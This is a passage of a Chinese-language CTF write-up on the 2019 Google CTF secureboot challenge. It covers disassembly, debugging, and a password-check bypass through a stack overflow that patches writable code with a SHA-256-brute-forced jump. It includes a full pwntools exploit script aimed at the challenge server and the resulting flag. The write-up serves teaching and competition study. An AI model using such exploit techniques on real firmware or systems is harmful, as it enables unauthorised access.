+<p>即可连接调试。<br>链接进去后用手速进入输入password的界面，然后断下来，检查内部执行情况可以发现，此时的程序段的确都是可执行的:<br><img src="/2019/07/30/2019-googlectf-writeup-part2/wp13.png"><br>之后有一个满头疼的点，我们需要找到此时的<code>uiapp</code>被映射的位置。这里似乎没有什么好办法，只能说翻找栈看看第三位有没有和IDA相同的数字了。通过逆向分析，可以知道如下的汇编:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000FF1E</span><br><span class="line">.text:000000000000FF1E loc_FF1E:                               ; CODE XREF: checkPassword+C2↑j</span><br><span class="line">.text:000000000000FF1E                 mov     rax, 8000000000000006h</span><br><span class="line">.text:000000000000FF28                 cmp     [rsp+0E8h+var_30], rax</span><br><span class="line">.text:000000000000FF30                 jz      short loc_FF35</span><br><span class="line">.text:000000000000FF32                 nop</span><br><span class="line">.text:000000000000FF33                 jmp     short loc_FEDE</span><br><span class="line">.text:000000000000FF35 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000000FF35</span><br><span class="line">.text:000000000000FF35 loc_FF35:                               ; CODE XREF: checkPassword+E0↑j</span><br><span class="line">.text:000000000000FF35                 mov     rax, cs:qword_1BC78</span><br><span class="line">.text:000000000000FF3C                 mov     rax, [rax+60h]</span><br><span class="line">.text:000000000000FF40                 mov     rdx, cs:qword_1BC68</span><br><span class="line">.text:000000000000FF47                 mov     rdx, [rdx+30h]</span><br><span class="line">.text:000000000000FF4B                 add     rdx, 10h</span><br><span class="line">.text:000000000000FF4F                 lea     rcx, [rsp+0E8h+var_B8]</span><br><span class="line">.text:000000000000FF54                 mov     r8, rcx</span><br><span class="line">.text:000000000000FF57                 mov     ecx, 1</span><br><span class="line">.text:000000000000FF5C                 call    rax ; 这里发生了类似scanf的调用</span><br><span class="line">.text:000000000000FF5E                 jmp     loc_FEDE</span><br></pre></td></tr></table></figure>
+<p>猜想说此处的<code>rax</code>调用的正是读取数据的函数，所以我们此时需要查找栈中地址尾部为<code>F5E</code>的地址，最后成功找到再:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">24:0120│   0x7ec17c8 —▸ 0x67daf5e ◂— jmp    0x67daede &#x2F;* 0x44b70fffffff7be9 *&#x2F;  </span><br></pre></td></tr></table></figure>
+<p>于是可以计算出此时段的基地址为<code>67daf5e - ff5e = 67CB000</code>。</p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>代码段本身居然能被修改，而且没有开启<code>ASLR</code>，这意味这我们不需要leak就可以修改任意内容，我们需要巧妙的利用这一点。这里比较容易想到的一点就是<strong>修改发生比较前后的代码</strong>。将发生跳转的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000FFBE                 cmp     rdx, rax</span><br><span class="line">.text:000000000000FFC1                 jz      short loc_10008; -------jump--from--here---&gt;&gt;</span><br></pre></td></tr></table></figure>
+<p>这个位置修改成<code>jmp $+b3</code>，那么就可以直接跳转到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000010074                 mov     eax, 1;   &lt;------arrive--here-----</span><br><span class="line">.text:0000000000010079                 jmp     short loc_100B4</span><br></pre></td></tr></table></figure>
+<p>不过查看反汇编，会发现<code>jmp +$0xb3</code>需要的字节码有、长，为<code>\xe9\xae\x00\x00\x00</code>，因为这个地方有一个无符号数<code>0xb3</code>，而爆破这么长的字节显然不合适，但是<strong>反向跳跃</strong>不需要那么多字节:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000010074                 mov     eax, 1           ;&lt;---------arrive here</span><br><span class="line">.text:0000000000010079                 jmp     short loc_100B4</span><br><span class="line">.text:000000000001007B loc_1007B:                              ; CODE XREF: checkPassword+173↑j</span><br><span class="line">.text:000000000001007B                                         ; checkPassword+1D4↑j ...</span><br><span class="line">.text:000000000001007B                 lea     rcx, aW         ; -------jump from here ----&gt;  </span><br><span class="line">.text:0000000000010082                 call    wputs</span><br><span class="line">.text:0000000000010087                 add     [rsp+0E8h+var_10], 1</span><br><span class="line">.text:0000000000010090</span><br><span class="line">.text:0000000000010090 loc_10090:                              ; CODE XREF: checkPassword+73↑j</span><br><span class="line">.text:0000000000010090                 cmp     [rsp+0E8h+var_10], 2  </span><br><span class="line">.text:0000000000010099                 jbe     loc_FEC8</span><br><span class="line">.text:000000000001009F                 mov     rax, [rsp+0E8h+exp]</span><br><span class="line">.text:00000000000100A7                 mov     rdi, rax</span><br><span class="line">.text:00000000000100AA                 call    sub_C46</span><br><span class="line">.text:00000000000100AF                 mov     eax, 0</span><br></pre></td></tr></table></figure>
+<p>如果从指定的位置进行jmp的话，那么此时只需要<code>0x1007b - 0x10074=0x7</code>，也就是说此时只需要跳转<code>jmp $f9</code>(<code>\xeb\xf7</code>)即可:<br>那么接下来要做的事情就很简单了:</p>
+<ul>
+<li>溢出修改v7的值为`0x67db07b</li>
+<li>计算sha256，让开头两字节为<code>\xeb\xf7</code></li>
+</ul>
+<p><em>说到调试问题，可以加入<code>-s</code>/<code>-gdb tcp::1234</code>表示进入调试模式，让程序先运行起来，然后本地使用gdb远程链接过去（此时注意qemu的命令行中不要加入<code>-S</code>防止被挂起）</em></p>
+<p>在调试期间发现一个漏掉的问题点:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> v6 = (*(__int64 (__fastcall **)(_QWORD, <span class="keyword">char</span> *))(*(_QWORD *)(qword_1BC68 + <span class="number">48</span>) + <span class="number">8</span>i64))(</span><br><span class="line">         *(_QWORD *)(qword_1BC68 + <span class="number">48</span>),</span><br><span class="line">         &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v6 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( chr )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v6 == <span class="number">0x8000000000000006</span>i64 )</span><br><span class="line">    (*(<span class="keyword">void</span> (__fastcall **)(__int64, __int64, <span class="keyword">char</span> *))(qword_1BC78 + <span class="number">96</span>))(</span><br><span class="line">      <span class="number">1</span>i64,</span><br><span class="line">      *(_QWORD *)(qword_1BC68 + <span class="number">48</span>) + <span class="number">16</span>i64,</span><br><span class="line">      &amp;v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个地方的<code>v6</code>在栈上位于<code>v7</code>之前，通过测试发现在读入我们的输入的时候会被置为<code>00000000</code>，所以在计算sha256的时候需要把这段默认为0，但是发送数据的时候这一段需要设置为任意可见字符防止被截断。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#   -*- codingP:utf-8   -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line">fname = <span class="string">&quot;&quot;</span></span><br><span class="line">ph = <span class="literal">None</span></span><br><span class="line">exp_opcode = <span class="string">&quot;jmp $-0x7&quot;</span></span><br><span class="line"><span class="comment"># target_addr = 0x67db07b - 32 + 2</span></span><br><span class="line">target_addr = <span class="number">0x67db07b</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    ph = process(<span class="string">&quot;./run.py&quot;</span>)</span><br><span class="line">    <span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">    <span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">    <span class="comment">#gdb.attach(ph)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ph = remote(<span class="string">&#x27;secureboot.ctfcompetition.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruce</span>(<span class="params">opcode</span>):</span></span><br><span class="line">    last_opcode = asm(opcode, arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> string.printable:</span><br><span class="line">                payload = i + j + k + <span class="string">&quot;A&quot;</span>*<span class="number">125</span> + <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span> + p32(target_addr)</span><br><span class="line">                <span class="keyword">if</span> hashlib.sha256(payload).digest()[:<span class="number">2</span>] == last_opcode:</span><br><span class="line">                    log.info(<span class="string">&quot;Find payload&quot;</span> + payload)</span><br><span class="line">                    print(hashlib.sha256(payload).hexdigest())</span><br><span class="line">                    payload = payload[<span class="number">0</span>:<span class="number">128</span>] + <span class="string">&quot;A&quot;</span>*<span class="number">8</span> + payload[<span class="number">136</span>:]</span><br><span class="line">                    log.info(<span class="string">&quot;Find payload&quot;</span> + payload)</span><br><span class="line">                    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;Find nothing..&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">ph</span>):</span></span><br><span class="line">    <span class="comment"># input(&quot;wait for gdb&quot;)</span></span><br><span class="line">    <span class="comment"># just sleep to wait</span></span><br><span class="line">    <span class="built_in">print</span> ph.recvn(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># sleep(1)</span></span><br><span class="line">    ph.send(<span class="string">&quot;\x1b[24~&quot;</span>)</span><br><span class="line">    <span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> ph.recvuntil(<span class="string">&quot;Password&quot;</span>)</span><br><span class="line">    <span class="comment"># a=raw_input(&quot;wait for gdb&quot;)</span></span><br><span class="line">    payload = bruce(exp_opcode)</span><br><span class="line">    <span class="comment"># payload = &quot;A&quot;</span></span><br><span class="line">    ph.send(payload+<span class="string">&quot;\r&quot;</span>)</span><br><span class="line">    <span class="comment"># ph.send(&#x27;1010&#x27; + &#x27;A&#x27; * 0x84 + p32(0x7ec18b8 - 32 + 1) + &#x27;\r&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">local</span>(<span class="params">ph</span>):</span></span><br><span class="line">    exploit(ph)</span><br><span class="line">    ph.interactive()</span><br><span class="line">    print(<span class="string">&quot;Finish attack, will delete file&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;rm -rf %s&quot;</span> % (fname))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># local(ph)</span></span><br><span class="line">    exploit(ph)</span><br><span class="line">    ph.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>如果只是本地测试的话，可以使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -,raw,echo&#x3D;0 SYSTEM:&quot;python exploit.py&quot;</span><br></pre></td></tr></table></figure>
+<p>来进行启动，会得到如下的画面:<br><img src="/2019/07/30/2019-googlectf-writeup-part2/wp14.png"><br>然后设置一下<code>Secure Boot</code>就能够让其正常启动。修改成<code>remote</code>模式之后即可到达最终答案</p>
+<p><img src="/2019/07/30/2019-googlectf-writeup-part2/wp15.png"><br><code>CTF&#123;pl4y1ng_with_v1rt_3F1_just_4fun&#125;</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://asuri.org/2019/07/30/2019-googlectf-writeup-part2/" data-id="clg6iymq30036guot4w3v4a8s" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/googlectf/" rel="tag">googlectf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/11/24/2020-Taihuctf-writeup/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          2020-Taihuctf-writeup
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/07/30/2019-googlectf-writeup-part1/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">2019-googlectf-writeup-part1</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+        <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/">Develop</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Devops/">Devops</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/">Pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Reverse/">Reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web-%E5%AE%89%E5%85%A8/">Web 安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Writeup/">Writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8/">安卓安全</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2015-3864/" rel="tag">CVE-2015-3864</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rev/" rel="tag">Rev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/analytics/" rel="tag">analytics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/googlectf/" rel="tag">googlectf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jctf/" rel="tag">jctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mirai/" rel="tag">mirai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nuaactf/" rel="tag">nuaactf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phantom/" rel="tag">phantom</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qzone/" rel="tag">qzone</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/suctf/" rel="tag">suctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virus/" rel="tag">virus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" rel="tag">文件格式漏洞</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/CVE-2015-3864/" style="font-size: 10px;">CVE-2015-3864</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Pwn/" style="font-size: 15px;">Pwn</a> <a href="/tags/RCE/" style="font-size: 15px;">RCE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Rev/" style="font-size: 10px;">Rev</a> <a href="/tags/Tools/" style="font-size: 15px;">Tools</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/analytics/" style="font-size: 10px;">analytics</a> <a href="/tags/googlectf/" style="font-size: 15px;">googlectf</a> <a href="/tags/jctf/" style="font-size: 10px;">jctf</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/mirai/" style="font-size: 10px;">mirai</a> <a href="/tags/nuaactf/" style="font-size: 15px;">nuaactf</a> <a href="/tags/phantom/" style="font-size: 10px;">phantom</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/qzone/" style="font-size: 10px;">qzone</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/suctf/" style="font-size: 10px;">suctf</a> <a href="/tags/virus/" style="font-size: 10px;">virus</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/xss/" style="font-size: 15px;">xss</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">文件格式漏洞</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/11/24/2020-Taihuctf-writeup/">2020-Taihuctf-writeup</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/30/2019-googlectf-writeup-part2/">2019-googlectf-writeup-part2</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/30/2019-googlectf-writeup-part1/">2019-googlectf-writeup-part1</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/22/Asuri_2019/">2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/10/PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F/">从一道题讲PHP复杂变量</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 All Members<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      <a href="https://beian.miit.gov.cn/" target="_blank">鲁ICP备15035817号-2</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/members" class="mobile-nav-link">Members</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+    
+  </div>
+
+</body>
+
+</html>
